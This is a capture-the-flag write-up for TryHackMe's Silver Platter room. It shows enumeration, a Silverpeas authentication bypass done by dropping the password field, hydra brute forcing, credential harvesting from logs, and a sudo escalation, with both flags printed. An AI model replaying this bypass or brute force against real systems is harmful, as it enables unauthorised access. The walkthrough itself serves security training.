## Silver Platter - TryHackMe Writeup

[Room Link](https://tryhackme.com/room/silverplatter)

Think you've got what it takes to outsmart the Hack Smarter Security team? They claim to be unbeatable, and now it's your chance to prove them wrong. 
Dive into their web server, find the hidden flags, and show the world your elite hacking skills. Good luck, and may the best hacker win!

But beware, this won't be a walk in the digital park. 
Hack Smarter Security has fortified the server against common attacks and their password policy requires passwords that have not been breached (they check it against the rockyou.txt wordlist - that's how 'cool' they are). 
The hacking gauntlet has been thrown, and it's time to elevate your game. Remember, only the most ingenious will rise to the top. 

May your code be swift, your exploits flawless, and victory yours!

Make sure you wait a full 5 minutes after you start the machine before scanning or doing any enumeration. This will make sure all the services have started. 

**IP: silverplatter.thm**

---

## 📌 General Information

**Room Difficulty**: Easy  <br>

**Room Type**: Linux Privilege Escalation, Web <br>

**Tools Used**: Nmap, Gobuster<br>

**Author**: <br>

[<img align='center' src="https://github.com/mauzware/mauzware/blob/main/LOGO%20NEW.png"/>](https://github.com/mauzware)

[TryHackMe Profile](https://tryhackme.com/p/mauzinho) <br>
[GitHub Profile](https://github.com/mauzware)

---

## 🔍 Enumeration

- Starting off with Nmap scan and Gobuster fuzzing.

  ```
  $ nmap -sC -sV -p- silverplatter.thm

  PORT     STATE SERVICE    VERSION
  22/tcp   open  ssh        OpenSSH 8.9p1 Ubuntu 3ubuntu0.4 (Ubuntu Linux; protocol 2.0)
  | ssh-hostkey: 
  |   256 1b:1c:87:8a:fe:34:16:c9:f7:82:37:2b:10:8f:8b:f1 (ECDSA)
  |_  256 26:6d:17:ed:83:9e:4f:2d:f6:cd:53:17:c8:80:3d:09 (ED25519)
  80/tcp   open  http       nginx 1.18.0 (Ubuntu)
  |_http-title: Hack Smarter Security
  |_http-server-header: nginx/1.18.0 (Ubuntu)
  8080/tcp open  http-proxy
  |_http-title: Error
  | fingerprint-strings: 
  |   FourOhFourRequest, GetRequest, HTTPOptions: 
  |     HTTP/1.1 404 Not Found
  |     Connection: close
  |     Content-Length: 74
  |     Content-Type: text/html
  |     Date: Mon, 09 Jun 2025 19:32:45 GMT
  |     <html><head><title>Error</title></head><body>404 - Not Found</body></html>
  |   GenericLines, Help, Kerberos, LDAPSearchReq, LPDString, RTSPRequest, SMBProgNeg, SSLSessionReq, Socks5, TLSSessionReq, TerminalServerCookie: 
  |     HTTP/1.1 400 Bad Request
  |     Content-Length: 0
  |_    Connection: close
  ```

  ```
  $ gobuster dir -u http://silverplatter.thm/ -w /usr/share/wordlists/dirb/common.txt

  ===============================================================
  Starting gobuster in directory enumeration mode
  ===============================================================
  /assets               (Status: 301) [Size: 178] [--> http://10.10.49.42/assets/]
  /images               (Status: 301) [Size: 178] [--> http://10.10.49.42/images/]
  /index.html           (Status: 200) [Size: 14124]
  Progress: 4614 / 4615 (99.98%)
  ===============================================================
  Finished
  ===============================================================
  
  $ gobuster dir -u http://silverplatter.thm:8080/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-small.txt
  
  ===============================================================
  Starting gobuster in directory enumeration mode
  ===============================================================
  /website              (Status: 302) [Size: 0] [--> http://10.10.49.42:8080/website/]
  /console              (Status: 302) [Size: 0] [--> /noredirect.html]
  Progress: 87664 / 87665 (100.00%)
  ===============================================================
  Finished
  ===============================================================
  ```
  
- Here, when you try to access any found directory you will see either 403 or 404.

- On the main page in contact section you can find this:

  ```
  If you'd like to get in touch with us, please reach out to our project manager on Silverpeas. His username is "scr1ptkiddy".
  ```
  
- We will note that username and then check `/silverpeas` on the port 8080, and well, there's a login page!

  ```http://silverplatter.thm:8080/silverpeas -> http://silverplatter.thm:8080/silverpeas/defaultLogin.jsp```

---

## 🌐 Web Exploitation

- OK, so here there's actually 2 ways to bypass login: weak authorization or brute force. I did it with Burp interception and removing the password parameter.
  More details about that CVE you can find [here](https://gist.github.com/ChrisPritchard/4b6d5c70d9329ef116266a6c238dcb2d).

  ```
  POST /silverpeas/AuthenticationServlet HTTP/1.1
  Host: silverplatter.thm:8080
  User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:128.0) Gecko/20100101 Firefox/128.0
  Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
  Accept-Language: en-US,en;q=0.5
  Accept-Encoding: gzip, deflate, br
  Content-Type: application/x-www-form-urlencoded
  Content-Length: 36
  Origin: http://silverplatter.thm:8080
  Connection: keep-alive
  Referer: http://silverplatter.thm:8080/silverpeas/defaultLogin.jsp
  Cookie: JSESSIONID=RG2HNOF4zRtsmh5IHn61OGRcKuHbjINKLpnrXVgA.ebabc79c6d2a
  Upgrade-Insecure-Requests: 1
  Priority: u=0, i
  
  Login=scr1ptkiddy&DomainId=0
  ```

- The other way of getting access is to brute force the password. Since in the challenge description is mentioned not to use rockyou wordlist, you can create a password list with cewl using the target website.

  ```
  $ cewl http://silverplatter.thm > passwords.txt

  $ hydra -l scr1ptkiddy -P passwords.txt silverplatter.thm -s 8080 http-post-form "/silverpeas/AuthenticationServlet:Login=^USER^&Password=^PASS^&DomainId=0:F=Login or password incorrect"
  Hydra v9.5 (c) 2023 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).
  
  Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2025-06-09 21:25:22
  [DATA] max 16 tasks per 1 server, overall 16 tasks, 345 login tries (l:1/p:345), ~22 tries per task
  [DATA] attacking http-post-form://silverplatter.thm:8080/silverpeas/AuthenticationServlet:Login=^USER^&Password=^PASS^&DomainId=0:F=Login or password incorrect
  [8080][http-post-form] host: silverplatter.thm   login: scr1ptkiddy   password: adipiscing
  1 of 1 target successfully completed, 1 valid password found
  [WARNING] Writing restore file because 2 final worker threads did not complete until end.
  [ERROR] 2 targets did not resolve or could not be connected
  [ERROR] 0 target did not complete
  Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2025-06-09 21:25:27
  ```
  
- After logging in you can see that user `scr1ptkiddy` has one notification. I also intercepted that request and found the `ID` as parameter.

  ```
  GET /silverpeas/RSILVERMAIL/jsp/ReadMessage.jsp?ID=5 HTTP/1.1
  Host: silverplatter.thm:8080
  User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:128.0) Gecko/20100101 Firefox/128.0
  Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
  Accept-Language: en-US,en;q=0.5
  Accept-Encoding: gzip, deflate, br
  Connection: keep-alive
  Referer: http://silverplatter.thm:8080/silverpeas/RSILVERMAIL/jsp/Main
  Cookie: JSESSIONID=RG2HNOF4zRtsmh5IHn61OGRcKuHbjINKLpnrXVgA.ebabc79c6d2a; defaultDomain=0; svpLogin=scr1ptkiddy; Silverpeas_Directory_Help=IKnowIt
  Upgrade-Insecure-Requests: 1
  Priority: u=0, i
  ```

- Honestly, I tried so hard and got so far with absuing IDOR but couldn't make it work, so I pivoted for another method.

- When you check all the users on the platform you will find users `Manager Manager` and `Administrateur`. Here, I logged out and did the same thing for Manager account like I did for `scr1ptkiddy`.

  ```
  PPOST /silverpeas/AuthenticationServlet HTTP/1.1
  Host: silverplatter.thm:8080
  User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:128.0) Gecko/20100101 Firefox/128.0
  Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
  Accept-Language: en-US,en;q=0.5
  Accept-Encoding: gzip, deflate, br
  Content-Type: application/x-www-form-urlencoded
  Content-Length: 36
  Origin: http://silverplatter.thm:8080
  Connection: keep-alive
  Referer: http://silverplatter.thm:8080/silverpeas/defaultLogin.jsp
  Cookie: JSESSIONID=RG2HNOF4zRtsmh5IHn61OGRcKuHbjINKLpnrXVgA.ebabc79c6d2a
  Upgrade-Insecure-Requests: 1
  Priority: u=0, i
  
  Login=Manager&DomainId=0
  ```

- Now, I'm in as `Manager`. You can find the SSH credentials in notification, use them to login with SSH and start looking for flags.

  ```
  SSH
  12/13/2023 Administrateur
  Notification manuelle
  -
  Delete
  Message:
  
  Dude how do you always forget the SSH password? Use a password manager and quit using your silly sticky notes. 
  
  Username: tim
  
  Password: cm0nt!md0ntf0rg3tth!spa$$w0rdagainlol
  ```

---

## 🧍 User Privilege Escalation

- First flag is already there.

  ```
  ssh tim@silverplatter.thm
  
  Last login: Wed Dec 13 16:33:12 2023 from 192.168.1.20
  tim@silver-platter:~$ whoami
  tim
  
  tim@silver-platter:~$ id
  uid=1001(tim) gid=1001(tim) groups=1001(tim),4(adm)
  
  tim@silver-platter:~$ pwd
  /home/tim
  
  tim@silver-platter:~$ ls -al
  total 12
  dr-xr-xr-x 2 root root 4096 Dec 13  2023 .
  drwxr-xr-x 4 root root 4096 Dec 13  2023 ..
  -rw-r--r-- 1 root root   38 Dec 13  2023 user.txt
  
  tim@silver-platter:~$ cat user.txt 
  THM{c4ca4238a0b923820dcc509a6f75849b}
  ```
  
- Before moving to root, we will need to escalate to another user `tyler` (pretty cool guy tho!). You can see that user `tim` is in `(adm)` group.

- Usually members of the group adm have permissions to read log files located inside /var/log/. Therefore, if you have compromised a user inside this group you should definitely take a look to the logs. So let's check them.

  ```
  tim@silver-platter:~$ find / -group adm 2>/dev/null
  /var/log/kern.log
  /var/log/syslog.3.gz
  /var/log/kern.log.2.gz
  /var/log/syslog.2.gz
  /var/log/auth.log.1
  /var/log/kern.log.1
  /var/log/dmesg.4.gz
  /var/log/dmesg
  /var/log/unattended-upgrades
  /var/log/unattended-upgrades/unattended-upgrades-dpkg.log
  /var/log/unattended-upgrades/unattended-upgrades-dpkg.log.1.gz
  /var/log/apt/term.log.1.gz
  /var/log/apt/term.log
  /var/log/dmesg.3.gz
  /var/log/syslog.1
  /var/log/dmesg.0
  /var/log/dmesg.2.gz
  /var/log/installer
  /var/log/installer/subiquity-client-info.log.2016
  /var/log/installer/subiquity-server-debug.log.2061
  /var/log/installer/curtin-install/subiquity-curthooks.conf
  /var/log/installer/curtin-install/subiquity-initial.conf
  /var/log/installer/curtin-install/subiquity-extract.conf
  /var/log/installer/curtin-install/subiquity-partitioning.conf
  /var/log/installer/subiquity-server-info.log.2061
  /var/log/installer/autoinstall-user-data
  /var/log/installer/subiquity-client-debug.log.2016
  /var/log/installer/installer-journal.txt
  /var/log/installer/cloud-init.log
  /var/log/installer/subiquity-curtin-apt.conf
  /var/log/nginx
  /var/log/nginx/access.log
  /var/log/nginx/error.log.1
  /var/log/nginx/access.log.2.gz
  /var/log/nginx/access.log.1
  /var/log/nginx/error.log
  /var/log/cloud-init.log
  /var/log/dmesg.1.gz
  /var/log/syslog
  /var/log/auth.log
  /var/log/kern.log.3.gz
  /var/log/cloud-init-output.log
  /var/log/auth.log.2.gz
  /var/log/auth.log.2
  /var/spool/rsyslog
  /etc/cloud/ds-identify.cfg
  /etc/cloud/clean.d/99-installer
  /etc/cloud/cloud.cfg.d/99-installer.cfg
  /etc/hosts
  /etc/hostname
  ```
  
- Now let's look for all the entries related to user `tyler`.

  ```
  tim@silver-platter:/home$ cd /var/log
  tim@silver-platter:/var/log$ grep -iR tyler
  [SNIP!]
  auth.log.2:Dec 13 15:44:30 silver-platter sudo:    tyler : TTY=tty1 ; PWD=/ ; USER=root ; COMMAND=/usr/bin/docker run --name silverpeas -p 8080:8000 -d -e DB_NAME=Silverpeas -e DB_USER=silverpeas -e DB_PASSWORD=_Zd_zx7N823/ -v silverpeas-log:/opt/silverpeas/log -v silverpeas-data:/opt/silvepeas/data --link postgresql:database sivlerpeas:silverpeas-6.3.1
  [SNIP!]
  ```

- NEVER REUSE PASSWORDS!!!!!!!!!!!!!!!!!!!!!!

  ```
  tim@silver-platter:/var/log$ su tyler
  Password:
  
  tyler@silver-platter:/var/log$ whoami
  tyler
  
  tyler@silver-platter:/var/log$ id
  uid=1000(tyler) gid=1000(tyler) groups=1000(tyler),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),110(lxd)
  ```

---

## 👑 Root Privilege Escalation

- This root escalation is easiest of my life.

  ```
  tyler@silver-platter:/var/log$ sudo -l
  [sudo] password for tyler: 
  Matching Defaults entries for tyler on silver-platter:
      env_reset, mail_badpass,
      secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin, use_pty
  
  User tyler may run the following commands on silver-platter:
      (ALL : ALL) ALL
  
  tyler@silver-platter:/var/log$ sudo cat /root/root.txt
  THM{098f6bcd4621d373cade4e832627b4f6}
  ```
  
- You can also use `sudo su` and actually become root, bye!

---

## 🏁 Flags

- **User Flag**: `THM{c4ca4238a0b923820dcc509a6f75849b}`
- **Root Flag**: `THM{098f6bcd4621d373cade4e832627b4f6}`

---

## 💬 Notes & Reflections

- What was challenging in this room for me?
  `Getting initial access.`

- What did I learn?
  `New login bypass technique.`

- I would recommend this room or any type of CTF challenge to every Cyber Security enthusiast since it will sharpen your skills better than any book/tutorial/course or walkthrough rooms on many different platforms!

- Thank you for reading! Enjoy, Have Fun and Happy Hacking! 🤟

---
